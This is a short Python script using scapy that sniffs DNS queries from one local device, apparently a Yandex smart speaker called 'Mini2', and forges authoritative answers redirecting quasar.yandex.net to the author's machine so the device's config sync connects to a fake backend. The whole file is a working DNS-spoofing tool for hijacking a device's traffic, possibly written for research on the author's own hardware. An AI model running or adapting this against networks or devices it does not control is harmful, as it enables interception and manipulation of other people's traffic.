#!/usr/bin/env python3
"""Answer Mini2's DNS queries for quasar.yandex.net with our own IP (192.168.1.68),
so its config sync connects straight to the fake backend on :443. Runs as root."""
from scapy.all import sniff, DNS, DNSQR, IP, UDP, DNSRR, send

MYIP = '192.168.1.68'

def answer(pkt):
    try:
        qname = pkt[DNSQR].qname.decode().rstrip('.')
    except Exception:
        return
    if qname == 'quasar.yandex.net' or qname.endswith('.quasar.yandex.net'):
        reply = (IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                 UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
                 DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                     an=DNSRR(rrname=pkt[DNSQR].qname, ttl=30, rdata=MYIP)))
        send(reply, iface='en0', verbose=0)
        print(f'answered {qname} -> {MYIP} (id={pkt[DNS].id})', flush=True)

sniff(iface='en0', filter='udp and src host 192.168.1.82 and dst port 53',
      prn=answer, store=0)
